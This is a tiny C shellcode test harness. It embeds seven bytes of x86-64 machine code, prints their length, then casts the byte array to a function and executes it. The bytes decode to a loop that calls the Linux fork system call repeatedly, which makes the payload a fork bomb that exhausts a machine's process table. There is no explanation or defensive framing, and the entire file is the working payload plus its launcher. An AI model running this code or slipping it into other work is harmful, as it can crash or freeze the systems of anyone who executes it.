#include<stdio.h>
#include<string.h>
 
 
unsigned char code[] = \
"\x6a\x39\x58\x0f\x05\x75\xf9";

main()
{
 
printf("Shellcode Length:  %d\n", (int)strlen(code));
 
int (*ret)() = (int(*)())code;
 
ret();
 
}
